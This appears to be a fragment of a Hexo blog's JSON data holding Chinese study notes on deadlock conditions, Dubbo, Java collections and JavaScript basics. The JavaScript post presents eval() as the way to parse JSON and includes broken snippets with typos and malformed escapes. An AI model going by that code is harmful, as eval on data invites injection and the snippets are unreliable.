能占有该资源。这是由资源本身的属性所决定的。如独木桥就是一种独占资源，两方的人不能同时过桥。\n\n\t〈2〉不可抢占条件。进程所获得的资源在未使用完毕之前，资源申请者不能强行地从资源占有者手中夺取资源，而只能由该资源的占有者进程自行释放。如过独木桥的\n\t人不能强迫对方后退，也不能非法地将对方推下桥，必须是桥上的人自己过桥后空出桥面（即主动释放占有资源），对方的人才能过桥。\n\n\t〈3〉占有且申请条件。进程至少已经占有一个资源，但又申请新的资源；由于该资源已被另外进程占有，此时该进程阻塞；但是，它在等待新资源之时，仍继续占用已占\n\t有的资源。还以过独木桥为例，甲乙两人在桥上相遇。甲走过一段桥面（即占有了一些资源），还需要走其余的桥面（申请新的资源），但那部分桥面被乙占有（乙走过一段桥面）\n\t甲过不去，前进不能，又不后退；乙也处于同样的状况。\n\n\t〈4〉循环等待条件。存在一个进程等待序列{P1，P2，...，Pn}，其中P1等待P2所占有的某一资源，P2等待P3所占有的某一源，......，而Pn等待P1所占有的的某一资源，形成一个进\n\t程循环等待环。就像前面的过独木桥问题，甲等待乙占有的桥面，而乙又等待甲占有的桥面，从而彼此循环等待。\n\n#### 解除死锁\n\t上面我们提到的这四个条件在死锁时会同时发生。也就是说，只要有一个必要条件不满足，则死锁就可以排除。","source":"_posts/死锁.md","raw":"---\ntitle: 死锁\ndate: 2015-06-12 15:05:55\ntags: JavaSE\n---\n#### 死锁的理解:\n\t进程A占有资源R1，等待进程B占有的资源Rr；进程B占有资源Rr，等待进程A占有的资源R1。而且资源R1和Rr只允许一个进程占用，\n\t即：不允许两个进程同时占用。结果，两个进程都不能继续执行，若不采取其它     措施，这种循环等待状况会无限期持续下去，就发生了进程死锁。\n     \n#### 死锁总结概念:\n\t所谓死锁，是指多个进程循环等待它方占有的资源而无限期地僵持下去的局面。\n\n#### 产生死锁的必要条件\n\n\t从以上分析可见，如果在计算机系统中同时具备下面四个必要条件时，那麽会发生死锁。换句话说，只要下面四个条件有一个不具备，系统就不会出现死锁。\n\t〈1〉互斥条件(从资源的属性讲)。即某个资源在一段时间内只能由一个进程占有，不能同时被两个或两个以上的进程占有。这种独占资源如CD-ROM驱动器，打印机等等，必\n\t须在占有该资源的进程主动释放它之后，其它进程才        能占有该资源。这是由资源本身的属性所决定的。如独木桥就是一种独占资源，两方的人不能同时过桥。\n\n\t〈2〉不可抢占条件。进程所获得的资源在未使用完毕之前，资源申请者不能强行地从资源占有者手中夺取资源，而只能由该资源的占有者进程自行释放。如过独木桥的\n\t人不能强迫对方后退，也不能非法地将对方推下桥，必须是桥上的人自己过桥后空出桥面（即主动释放占有资源），对方的人才能过桥。\n\n\t〈3〉占有且申请条件。进程至少已经占有一个资源，但又申请新的资源；由于该资源已被另外进程占有，此时该进程阻塞；但是，它在等待新资源之时，仍继续占用已占\n\t有的资源。还以过独木桥为例，甲乙两人在桥上相遇。甲走过一段桥面（即占有了一些资源），还需要走其余的桥面（申请新的资源），但那部分桥面被乙占有（乙走过一段桥面）\n\t甲过不去，前进不能，又不后退；乙也处于同样的状况。\n\n\t〈4〉循环等待条件。存在一个进程等待序列{P1，P2，...，Pn}，其中P1等待P2所占有的某一资源，P2等待P3所占有的某一源，......，而Pn等待P1所占有的的某一资源，形成一个进\n\t程循环等待环。就像前面的过独木桥问题，甲等待乙占有的桥面，而乙又等待甲占有的桥面，从而彼此循环等待。\n\n#### 解除死锁\n\t上面我们提到的这四个条件在死锁时会同时发生。也就是说，只要有一个必要条件不满足，则死锁就可以排除。","slug":"死锁","published":1,"updated":"2018-01-31T07:07:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx4003hmfahg55z1ppv","content":"<h4 id=\"死锁的理解\"><a href=\"#死锁的理解\" class=\"headerlink\" title=\"死锁的理解:\"></a>死锁的理解:</h4><pre><code>进程A占有资源R1，等待进程B占有的资源Rr；进程B占有资源Rr，等待进程A占有的资源R1。而且资源R1和Rr只允许一个进程占用，\n即：不允许两个进程同时占用。结果，两个进程都不能继续执行，若不采取其它     措施，这种循环等待状况会无限期持续下去，就发生了进程死锁。\n</code></pre><h4 id=\"死锁总结概念\"><a href=\"#死锁总结概念\" class=\"headerlink\" title=\"死锁总结概念:\"></a>死锁总结概念:</h4><pre><code>所谓死锁，是指多个进程循环等待它方占有的资源而无限期地僵持下去的局面。\n</code></pre><h4 id=\"产生死锁的必要条件\"><a href=\"#产生死锁的必要条件\" class=\"headerlink\" title=\"产生死锁的必要条件\"></a>产生死锁的必要条件</h4><pre><code>从以上分析可见，如果在计算机系统中同时具备下面四个必要条件时，那麽会发生死锁。换句话说，只要下面四个条件有一个不具备，系统就不会出现死锁。\n〈1〉互斥条件(从资源的属性讲)。即某个资源在一段时间内只能由一个进程占有，不能同时被两个或两个以上的进程占有。这种独占资源如CD-ROM驱动器，打印机等等，必\n须在占有该资源的进程主动释放它之后，其它进程才        能占有该资源。这是由资源本身的属性所决定的。如独木桥就是一种独占资源，两方的人不能同时过桥。\n\n〈2〉不可抢占条件。进程所获得的资源在未使用完毕之前，资源申请者不能强行地从资源占有者手中夺取资源，而只能由该资源的占有者进程自行释放。如过独木桥的\n人不能强迫对方后退，也不能非法地将对方推下桥，必须是桥上的人自己过桥后空出桥面（即主动释放占有资源），对方的人才能过桥。\n\n〈3〉占有且申请条件。进程至少已经占有一个资源，但又申请新的资源；由于该资源已被另外进程占有，此时该进程阻塞；但是，它在等待新资源之时，仍继续占用已占\n有的资源。还以过独木桥为例，甲乙两人在桥上相遇。甲走过一段桥面（即占有了一些资源），还需要走其余的桥面（申请新的资源），但那部分桥面被乙占有（乙走过一段桥面）\n甲过不去，前进不能，又不后退；乙也处于同样的状况。\n\n〈4〉循环等待条件。存在一个进程等待序列{P1，P2，...，Pn}，其中P1等待P2所占有的某一资源，P2等待P3所占有的某一源，......，而Pn等待P1所占有的的某一资源，形成一个进\n程循环等待环。就像前面的过独木桥问题，甲等待乙占有的桥面，而乙又等待甲占有的桥面，从而彼此循环等待。\n</code></pre><h4 id=\"解除死锁\"><a href=\"#解除死锁\" class=\"headerlink\" title=\"解除死锁\"></a>解除死锁</h4><pre><code>上面我们提到的这四个条件在死锁时会同时发生。也就是说，只要有一个必要条件不满足，则死锁就可以排除。\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"死锁的理解\"><a href=\"#死锁的理解\" class=\"headerlink\" title=\"死锁的理解:\"></a>死锁的理解:</h4><pre><code>进程A占有资源R1，等待进程B占有的资源Rr；进程B占有资源Rr，等待进程A占有的资源R1。而且资源R1和Rr只允许一个进程占用，\n即：不允许两个进程同时占用。结果，两个进程都不能继续执行，若不采取其它     措施，这种循环等待状况会无限期持续下去，就发生了进程死锁。\n</code></pre><h4 id=\"死锁总结概念\"><a href=\"#死锁总结概念\" class=\"headerlink\" title=\"死锁总结概念:\"></a>死锁总结概念:</h4><pre><code>所谓死锁，是指多个进程循环等待它方占有的资源而无限期地僵持下去的局面。\n</code></pre><h4 id=\"产生死锁的必要条件\"><a href=\"#产生死锁的必要条件\" class=\"headerlink\" title=\"产生死锁的必要条件\"></a>产生死锁的必要条件</h4><pre><code>从以上分析可见，如果在计算机系统中同时具备下面四个必要条件时，那麽会发生死锁。换句话说，只要下面四个条件有一个不具备，系统就不会出现死锁。\n〈1〉互斥条件(从资源的属性讲)。即某个资源在一段时间内只能由一个进程占有，不能同时被两个或两个以上的进程占有。这种独占资源如CD-ROM驱动器，打印机等等，必\n须在占有该资源的进程主动释放它之后，其它进程才        能占有该资源。这是由资源本身的属性所决定的。如独木桥就是一种独占资源，两方的人不能同时过桥。\n\n〈2〉不可抢占条件。进程所获得的资源在未使用完毕之前，资源申请者不能强行地从资源占有者手中夺取资源，而只能由该资源的占有者进程自行释放。如过独木桥的\n人不能强迫对方后退，也不能非法地将对方推下桥，必须是桥上的人自己过桥后空出桥面（即主动释放占有资源），对方的人才能过桥。\n\n〈3〉占有且申请条件。进程至少已经占有一个资源，但又申请新的资源；由于该资源已被另外进程占有，此时该进程阻塞；但是，它在等待新资源之时，仍继续占用已占\n有的资源。还以过独木桥为例，甲乙两人在桥上相遇。甲走过一段桥面（即占有了一些资源），还需要走其余的桥面（申请新的资源），但那部分桥面被乙占有（乙走过一段桥面）\n甲过不去，前进不能，又不后退；乙也处于同样的状况。\n\n〈4〉循环等待条件。存在一个进程等待序列{P1，P2，...，Pn}，其中P1等待P2所占有的某一资源，P2等待P3所占有的某一源，......，而Pn等待P1所占有的的某一资源，形成一个进\n程循环等待环。就像前面的过独木桥问题，甲等待乙占有的桥面，而乙又等待甲占有的桥面，从而彼此循环等待。\n</code></pre><h4 id=\"解除死锁\"><a href=\"#解除死锁\" class=\"headerlink\" title=\"解除死锁\"></a>解除死锁</h4><pre><code>上面我们提到的这四个条件在死锁时会同时发生。也就是说，只要有一个必要条件不满足，则死锁就可以排除。\n</code></pre>"},{"title":"购物车模型","date":"2017-08-09T06:42:47.000Z","_content":"![JavaEE](购物车模型/1.png)","source":"_posts/购物车模型.md","raw":"---\ntitle: 购物车模型\ndate: 2017-08-09 14:42:47\ntags: JavaEE\n---\n![JavaEE](购物车模型/1.png)","slug":"购物车模型","published":1,"updated":"2018-01-31T06:43:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx5003jmfah7g0o7vav","content":"<p><img src=\"购物车模型/1.png\" alt=\"JavaEE\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"购物车模型/1.png\" alt=\"JavaEE\"></p>\n"},{"title":"阿里巴巴Rpc框架Dubble","date":"2015-04-29T05:15:44.000Z","_content":"\n## Dubbo是什么 ##\n\tDubbo 是阿里巴巴公司开源的一个高性能优秀的服务框架\n## Dubbo的运行原理: ##\n![](https://i.imgur.com/wG0WrYK.png)\n## 作为服务方的配置： ##\n\n\t1.声明服务提供方\n\t2.声明注册中心\n\t3.声明提供的服务接口\n## 作为消费者的配置 ##\n\n\t1.声明消费者\n\t2.生命注册中心\n\t3.声明消费接口\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/阿里巴巴Rpc框架Dubble.md","raw":"---\ntitle: 阿里巴巴Rpc框架Dubble\ndate: 2015-4-29 13:15:44\ntags: RPC\n---\n\n## Dubbo是什么 ##\n\tDubbo 是阿里巴巴公司开源的一个高性能优秀的服务框架\n## Dubbo的运行原理: ##\n![](https://i.imgur.com/wG0WrYK.png)\n## 作为服务方的配置： ##\n\n\t1.声明服务提供方\n\t2.声明注册中心\n\t3.声明提供的服务接口\n## 作为消费者的配置 ##\n\n\t1.声明消费者\n\t2.生命注册中心\n\t3.声明消费接口\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"阿里巴巴Rpc框架Dubble","published":1,"updated":"2017-12-29T15:28:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx6003mmfaheztsmhjf","content":"<h2 id=\"Dubbo是什么\"><a href=\"#Dubbo是什么\" class=\"headerlink\" title=\"Dubbo是什么\"></a>Dubbo是什么</h2><pre><code>Dubbo 是阿里巴巴公司开源的一个高性能优秀的服务框架\n</code></pre><h2 id=\"Dubbo的运行原理\"><a href=\"#Dubbo的运行原理\" class=\"headerlink\" title=\"Dubbo的运行原理:\"></a>Dubbo的运行原理:</h2><p><img src=\"https://i.imgur.com/wG0WrYK.png\" alt=\"\"></p>\n<h2 id=\"作为服务方的配置：\"><a href=\"#作为服务方的配置：\" class=\"headerlink\" title=\"作为服务方的配置：\"></a>作为服务方的配置：</h2><pre><code>1.声明服务提供方\n2.声明注册中心\n3.声明提供的服务接口\n</code></pre><h2 id=\"作为消费者的配置\"><a href=\"#作为消费者的配置\" class=\"headerlink\" title=\"作为消费者的配置\"></a>作为消费者的配置</h2><pre><code>1.声明消费者\n2.生命注册中心\n3.声明消费接口\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Dubbo是什么\"><a href=\"#Dubbo是什么\" class=\"headerlink\" title=\"Dubbo是什么\"></a>Dubbo是什么</h2><pre><code>Dubbo 是阿里巴巴公司开源的一个高性能优秀的服务框架\n</code></pre><h2 id=\"Dubbo的运行原理\"><a href=\"#Dubbo的运行原理\" class=\"headerlink\" title=\"Dubbo的运行原理:\"></a>Dubbo的运行原理:</h2><p><img src=\"https://i.imgur.com/wG0WrYK.png\" alt=\"\"></p>\n<h2 id=\"作为服务方的配置：\"><a href=\"#作为服务方的配置：\" class=\"headerlink\" title=\"作为服务方的配置：\"></a>作为服务方的配置：</h2><pre><code>1.声明服务提供方\n2.声明注册中心\n3.声明提供的服务接口\n</code></pre><h2 id=\"作为消费者的配置\"><a href=\"#作为消费者的配置\" class=\"headerlink\" title=\"作为消费者的配置\"></a>作为消费者的配置</h2><pre><code>1.声明消费者\n2.生命注册中心\n3.声明消费接口\n</code></pre>"},{"title":"图片上传到分布式文件系统","date":"2015-12-01T06:46:38.000Z","_content":"![JavaEE](图片上传到分布式文件系统/1.png)","source":"_posts/图片上传到分布式文件系统.md","raw":"---\ntitle: 图片上传到分布式文件系统\ndate: 2015-11-31 14:46:38\ntags: JavaEE\n---\n![JavaEE](图片上传到分布式文件系统/1.png)","slug":"图片上传到分布式文件系统","published":1,"updated":"2018-01-31T06:47:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx7003omfahylwcmolb","content":"<p><img src=\"图片上传到分布式文件系统/1.png\" alt=\"JavaEE\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"图片上传到分布式文件系统/1.png\" alt=\"JavaEE\"></p>\n"},{"title":"集合框架体系图","date":"2016-12-29T06:44:57.000Z","_content":"### Collection单列集合继承体系:\n![](https://i.imgur.com/5W7IPY4.png)\n\n### Map双列集合继承体系:\n![](https://i.imgur.com/PzRxOqt.png)\n","source":"_posts/集合框架体系图.md","raw":"---\ntitle: 集合框架体系图\ndate: 2016-12-29 14:44:57\ntags: JavaSE\n---\n### Collection单列集合继承体系:\n![](https://i.imgur.com/5W7IPY4.png)\n\n### Map双列集合继承体系:\n![](https://i.imgur.com/PzRxOqt.png)\n","slug":"集合框架体系图","published":1,"updated":"2017-12-29T15:27:50.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx8003rmfah7jn2k70m","content":"<h3 id=\"Collection单列集合继承体系\"><a href=\"#Collection单列集合继承体系\" class=\"headerlink\" title=\"Collection单列集合继承体系:\"></a>Collection单列集合继承体系:</h3><p><img src=\"https://i.imgur.com/5W7IPY4.png\" alt=\"\"></p>\n<h3 id=\"Map双列集合继承体系\"><a href=\"#Map双列集合继承体系\" class=\"headerlink\" title=\"Map双列集合继承体系:\"></a>Map双列集合继承体系:</h3><p><img src=\"https://i.imgur.com/PzRxOqt.png\" alt=\"\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Collection单列集合继承体系\"><a href=\"#Collection单列集合继承体系\" class=\"headerlink\" title=\"Collection单列集合继承体系:\"></a>Collection单列集合继承体系:</h3><p><img src=\"https://i.imgur.com/5W7IPY4.png\" alt=\"\"></p>\n<h3 id=\"Map双列集合继承体系\"><a href=\"#Map双列集合继承体系\" class=\"headerlink\" title=\"Map双列集合继承体系:\"></a>Map双列集合继承体系:</h3><p><img src=\"https://i.imgur.com/PzRxOqt.png\" alt=\"\"></p>\n"},{"title":"JS基础知识点","date":"2018-01-31T01:05:37.000Z","_content":"#### 什么是JS中的闭包\n闭包就是能够读取其他函数内部变量的函数\n\n\tfunction foo(x) {\n\t    var tmp = 3;\n\t    return function (y) {\n\t\talert(x + y + (++tmp));\n\t    }\n\t}\n\tvar bar = foo(2); // bar 现在是一个闭包\n\tbar(10);\n&emsp;&emsp;由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数\n\n#### JS的数据类型\n\t1.基本数据类型:String,Boolean,Number,Undefined, NULL\n\t2.引用数据类型:Object(Array,Date,RegExp,Function)\n\n#### 获取页面中所有的input\n\tvar domList = document.getElementsByTagName(‘input’)\n\n#### 什么是Ajax和JSON，它们的优缺点\n\tAjax是异步的Javascript和XML,用于WEB页面中异步数据交互\n\t优点:\n\t\t1.使得用户在不刷新页面的情况下加载数据,提高用户的体验性\n\t\t2.在不重载页面的情况下加载局部数据,减少数据的交互量  \n\t缺点:\n\t\t1.存在安全问题\n\t\t2.对搜索引擎支持不好\n\t\t3.一些手持设备目前还不支持  \n Json是一个轻量级的数据交互格式,ECMA的一个子集,所以js支持性好\n\n\t优点:\n\t\t1.轻量级,易于人编写和阅读\n\t\t2.是ECMA的一个子集,和js结合好,便于解析\n\n#### 什么是eval()函数\n此函数是将json格式的字符串转换成JavaScript对象\n\n#### JS遍历Json数据\n\n\tvar data=[{name:\"a\",age:12},{name:\"b\",age:11},{name:\"c\",age:13},{name:\"d\",age:14}];\n\tfor(var o in data){\n\t\talert(o);\n\t\talert(data[o]);\n\t\talert(\"text:\"+data[o].name+\" value:\"+data[o].age );\n\t}\n\n\t<script type=\"text/javascript\">\n\t\tfunction text(){\n\t\t\tvar json = {\"options\":\"[{/\"text/\":/\"王家湾/\",/\"value/\":/\"9/\"},{/\"text/\":/\"李家湾/\",/\"value/\":/\"10/\"},{/\"text/\":/\"邵家湾/\",/\"value/\":/\"13/\"}]\"}\n\t\t\tjson = eval(json.options)\n\t\t\tfor(var i=0; i<json.length; i++){\n\t\t\t\talert(json[i].text+\" \" + json[i].value)\n\t\t\t}\n\t\t}\n\t</script>\n\n#### Ajax技术原理\n&emsp;&emsp;Ajax是通过XMLHTTPRequest对象异步向服务器端发送请求,服务器端接收请求处理,返回XML或者JSON数据\n\n#### Ajax的执行步骤\n1.创建XMLHTTPRequest对象\n2.监听 onreadystatechange事件\n3.打开连接\n4.发送请求\n\n\tfunction Ustbwuyi() {\n\t    var data = document.getElementById(\"username\").value;\n\t    CreateXmlHttp();\n\t    if (!xmlhttp) {\n\t\talert(\"创建xmlhttp对象异常！\");\n\t\treturn false;\n\t    }\n\n\t    xmlhttp.open(\"POST\", url, false);\n\n\t    xmlhttp.onreadystatechange = function () {\n\t\tif (xmlhttp.readyState == 4) {\n\t\t    document.getElementById(\"user1\").innerHTML = \"数据正在加载...\";\n\t\t    if (xmlhttp.status == 200) {\n\t\t        document.write(xmlhttp.responseText);\n\t\t    }\n\t\t}\n\t    }\n\t    xmlhttp.send();\n\t}\n\nXmlHttpRequest对象解析:\n　　   它的属性有：\n  　　  onreadystatechange  每次状态改变所触发事件的事件处理程序。\n  　　  responseText     从服务器进程返回数据的字符串形式。\n  　　  responseXML    从服务器进程返回的DOM兼容的文档数据对象。\n  　　  status           从服务器返回的数字代码，比如常见的404（未找到）和200（已就绪）\n  　　  status Text       伴随状态码的字符串信息\n  　　  readyState       对象状态值\n　　　　0 (未初始化) 对象已建立，但是尚未初始化（尚未调用open方法）\n　　　　1 (初始化) 对象已建立，尚未调用send方法\n　　　　2 (发送数据) send方法已调用，但是当前的状态及http头未知\n　　　　3 (数据传送中) 已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，\n　　　　4 (完成) 数据接收完毕,此时可以通过通过responseXml和responseText获取完整的回应数据\n\n定义js对象和属性\n\n\tvar person = function(){};\n\tvar p = persopn.prototype;\n\tp.name='张三';\n\tpage=18;\n\tp.add = function() {\n\t\talert(\"HELLO\");\n\t}\n","source":"_posts/JS基础知识点.md","raw":"---\ntitle: JS基础知识点\ndate: 2018-01-31 09:05:37\ntags: JS\n---\n#### 什么是JS中的闭包\n闭包就是能够读取其他函数内部变量的函数\n\n\tfunction foo(x) {\n\t    var tmp = 3;\n\t    return function (y) {\n\t\talert(x + y + (++tmp));\n\t    }\n\t}\n\tvar bar = foo(2); // bar 现在是一个闭包\n\tbar(10);\n&emsp;&emsp;由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数\n\n#### JS的数据类型\n\t1.基本数据类型:String,Boolean,Number,Undefined, NULL\n\t2.引用数据类型:Object(Array,Date,RegExp,Function)\n\n#### 获取页面中所有的input\n\tvar domList = document.getElementsByTagName(‘input’)\n\n#### 什么是Ajax和JSON，它们的优缺点\n\tAjax是异步的Javascript和XML,用于WEB页面中异步数据交互\n\t优点:\n\t\t1.使得用户在不刷新页面的情况下加载数据,提高用户的体验性\n\t\t2.在不重载页面的情况下加载局部数据,减少数据的交互量  \n\t缺点:\n\t\t1.存在安全问题\n\t\t2.对搜索引擎支持不好\n\t\t3.一些手持设备目前还不支持  \n Json是一个轻量级的数据交互格式,ECMA的一个子集,所以js支持性好\n\n\t优点:\n\t\t1.轻量级,易于人编写和阅读\n\t\t2.是ECMA的一个子集,和js结合好,便于解析\n\n#### 什么是eval()函数\n此函数是将json格式的字符串转换成JavaScript对象\n\n#### JS遍历Json数据\n\n\tvar data=[{name:\"a\",age:12},{name:\"b\",age:11},{name:\"c\",age:13},{name:\"d\",age:14}];\n\tfor(var o in data){\n\t\talert(o);\n\t\talert(data[o]);\n\t\talert(\"text:\"+data[o].name+\" value:\"+data[o].age );\n\t}\n\n\t<script type=\"text/javascript\">\n\t\tfunction text(){\n\t\t\tvar json = {\"options\":\"[{/\"text/\":/\"王家湾/\",/\"value/\":/\"9/\"},{/\"text/\":/\"李家湾/\",/\"value/\":/\"10/\"},{/\"text/\":/\"邵家湾/\",/\"value/\":/\"13/\"}]\"}\n\t\t\tjson = eval(json.options)\n\t\t\tfor(var i=0; i<json.length; i++){\n\t\t\t\talert(json[i].text+\" \" + json[i].value)\n\t\t\t}\n\t\t}\n\t</script>\n\n#### Ajax技术原理\n&emsp;&emsp;Ajax是通过XMLHTTPRequest对象异步向服务器端发送请求,服务器端接收请求处理,返回XML或者JSON数据\n\n#### Ajax的执行步骤\n1.创建XMLHTTPRequest对象\n2.监听 onreadystatechange事件\n3.打开连接\n4.发送请求\n\n\tfunction Ustbwuyi() {\n\t    var data = document.getElementById(\"username\").value;\n\t    CreateXmlHttp();\n\t    if (!xmlhttp) {\n\t\talert(\"创建xmlhttp对象异常！\");\n\t\treturn false;\n\t    }\n\n\t    xmlhttp.open(\"POST\", url, false);\n\n\t    xmlhttp.onreadystatechange = function () {\n\t\tif (xmlhttp.readyState == 4) {\n\t\t    document.getElementById(\"user1\").innerHTML = \"数据正在加载...\";\n\t\t    if (xmlhttp.status == 200) {\n\t\t        document.write(xmlhttp.responseText);\n\t\t    }\n\t\t}\n\t    }\n\t    xmlhttp.send();\n\t}\n\nXmlHttpRequest对象解析:\n　　   它的属性有：\n  　　  onreadystatechange  每次状态改变所触发事件的事件处理程序。\n  　　  responseText     从服务器进程返回数据的字符串形式。\n  　　  responseXML    从服务器进程返回的DOM兼容的文档数据对象。\n  　　  status           从服务器返回的数字代码，比如常见的404（未找到）和200（已就绪）\n  　　  status Text       伴随状态码的字符串信息\n  　　  readyState       对象状态值\n　　　　0 (未初始化) 对象已建立，但是尚未初始化（尚未调用open方法）\n　　　　1 (初始化) 对象已建立，尚未调用send方法\n　　　　2 (发送数据) send方法已调用，但是当前的状态及http头未知\n　　　　3 (数据传送中) 已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，\n　　　　4 (完成) 数据接收完毕,此时可以通过通过responseXml和responseText获取完整的回应数据\n\n定义js对象和属性\n\n\tvar person = function(){};\n\tvar p = persopn.prototype;\n\tp.name='张三';\n\tpage=18;\n\tp.add = function() {\n\t\talert(\"HELLO\");\n\t}\n","slug":"JS基础知识点","published":1,"updated":"2018-01-31T05:32:04.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tx9003tmfahusol42eh","content":"<h4 id=\"什么是JS中的闭包\"><a href=\"#什么是JS中的闭包\" class=\"headerlink\" title=\"什么是JS中的闭包\"></a>什么是JS中的闭包</h4><p>闭包就是能够读取其他函数内部变量的函数</p>\n<pre><code>function foo(x) {\n    var tmp = 3;\n    return function (y) {\n    alert(x + y + (++tmp));\n    }\n}\nvar bar = foo(2); // bar 现在是一个闭包\nbar(10);\n</code></pre><p>&emsp;&emsp;由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数</p>\n<h4 id=\"JS的数据类型\"><a href=\"#JS的数据类型\" class=\"headerlink\" title=\"JS的数据类型\"></a>JS的数据类型</h4><pre><code>1.基本数据类型:String,Boolean,Number,Undefined, NULL\n2.引用数据类型:Object(Array,Date,RegExp,Function)\n</code></pre><h4 id=\"获取页面中所有的input\"><a href=\"#获取页面中所有的input\" class=\"headerlink\" title=\"获取页面中所有的input\"></a>获取页面中所有的input</h4><pre><code>var domList = document.getElementsByTagName(‘input’)\n</code></pre><h4 id=\"什么是Ajax和JSON，它们的优缺点\"><a href=\"#什么是Ajax和JSON，它们的优缺点\" class=\"headerlink\" title=\"什么是Ajax和JSON，它们的优缺点\"></a>什么是Ajax和JSON，它们的优缺点</h4><pre><code>Ajax是异步的Javascript和XML,用于WEB页面中异步数据交互\n优点:\n    1.使得用户在不刷新页面的情况下加载数据,提高用户的体验性\n    2.在不重载页面的情况下加载局部数据,减少数据的交互量  \n缺点:\n    1.存在安全问题\n    2.对搜索引擎支持不好\n    3.一些手持设备目前还不支持  \n</code></pre><p> Json是一个轻量级的数据交互格式,ECMA的一个子集,所以js支持性好</p>\n<pre><code>优点:\n    1.轻量级,易于人编写和阅读\n    2.是ECMA的一个子集,和js结合好,便于解析\n</code></pre><h4 id=\"什么是eval-函数\"><a href=\"#什么是eval-函数\" class=\"headerlink\" title=\"什么是eval()函数\"></a>什么是eval()函数</h4><p>此函数是将json格式的字符串转换成JavaScript对象</p>\n<h4 id=\"JS遍历Json数据\"><a href=\"#JS遍历Json数据\" class=\"headerlink\" title=\"JS遍历Json数据\"></a>JS遍历Json数据</h4><pre><code>var data=[{name:&quot;a&quot;,age:12},{name:&quot;b&quot;,age:11},{name:&quot;c&quot;,age:13},{name:&quot;d&quot;,age:14}];\nfor(var o in data){\n    alert(o);\n    alert(data[o]);\n    alert(&quot;text:&quot;+data[o].name+&quot; value:&quot;+data[o].age );\n}\n\n&lt;script type=&quot;text/javascript&quot;&gt;\n    function text(){\n        var json = {&quot;options&quot;:&quot;[{/&quot;text/&quot;:/&quot;王家湾/&quot;,/&quot;value/&quot;:/&quot;9/&quot;},{/&quot;text/&quot;:/&quot;李家湾/&quot;,/&quot;value/&quot;:/&quot;10/&quot;},{/&quot;text/&quot;:/&quot;邵家湾/&quot;,/&quot;value/&quot;:/&quot;13/&quot;}]&quot;}\n        json = eval(json.options)\n        for(var i=0; i&lt;json.length; i++){\n            alert(json[i].text+&quot; &quot; + json[i].value)\n        }\n    }\n&lt;/script&gt;\n</code></pre><h4 id=\"Ajax技术原理\"><a href=\"#Ajax技术原理\" class=\"headerlink\" title=\"Ajax技术原理\"></a>Ajax技术原理</h4><p>&emsp;&emsp;Ajax是通过XMLHTTPRequest对象异步向服务器端发送请求,服务器端接收请求处理,返回XML或者JSON数据</p>\n<h4 id=\"Ajax的执行步骤\"><a href=\"#Ajax的执行步骤\" class=\"headerlink\" title=\"Ajax的执行步骤\"></a>Ajax的执行步骤</h4><p>1.创建XMLHTTPRequest对象<br>2.监听 onreadystatechange事件<br>3.打开连接<br>4.发送请求</p>\n<pre><code>function Ustbwuyi() {\n    var data = document.getElementById(&quot;username&quot;).value;\n    CreateXmlHttp();\n    if (!xmlhttp) {\n    alert(&quot;创建xmlhttp对象异常！&quot;);\n    return false;\n    }\n\n    xmlhttp.open(&quot;POST&quot;, url, false);\n\n    xmlhttp.onreadystatechange = function () {\n    if (xmlhttp.readyState == 4) {\n        document.getElementById(&quot;user1&quot;).innerHTML = &quot;数据正在加载...&quot;;\n        if (xmlhttp.status == 200) {\n            document.write(xmlhttp.responseText);\n        }\n    }\n    }\n    xmlhttp.send();\n}\n</code></pre><p>XmlHttpRequest对象解析:<br>　　   它的属性有：<br>  　　  onreadystatechange  每次状态改变所触发事件的事件处理程序。<br>  　　  responseText     从服务器进程返回数据的字符串形式。<br>  　　  responseXML    从服务器进程返回的DOM兼容的文档数据对象。<br>  　　  status           从服务器返回的数字代码，比如常见的404（未找到）和200（已就绪）<br>  　　  status Text       伴随状态码的字符串信息<br>  　　  readyState       对象状态值<br>　　　　0 (未初始化) 对象已建立，但是尚未初始化（尚未调用open方法）<br>　　　　1 (初始化) 对象已建立，尚未调用send方法<br>　　　　2 (发送数据) send方法已调用，但是当前的状态及http头未知<br>　　　　3 (数据传送中) 已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，<br>　　　　4 (完成) 数据接收完毕,此时可以通过通过responseXml和responseText获取完整的回应数据</p>\n<p>定义js对象和属性</p>\n<pre><code>var person = function(){};\nvar p = persopn.prototype;\np.name=&apos;张三&apos;;\npage=18;\np.add = function() {\n    alert(&quot;HELLO&quot;);\n}\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"什么是JS中的闭包\"><a href=\"#什么是JS中的闭包\" class=\"headerlink\" title=\"什么是JS中的闭包\"></a>什么是JS中的闭包</h4><p>闭包就是能够读取其他函数内部变量的函数</p>\n<pre><code>function foo(x) {\n    var tmp = 3;\n    return function (y) {\n    alert(x + y + (++tmp));\n    }\n}\nvar bar = foo(2); // bar 现在是一个闭包\nbar(10);\n</code></pre><p>&emsp;&emsp;由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数</p>\n<h4 id=\"JS的数据类型\"><a href=\"#JS的数据类型\" class=\"headerlink\" title=\"JS的数据类型\"></a>JS的数据类型</h4><pre><code>1.基本数据类型:String,Boolean,Number,Undefined, 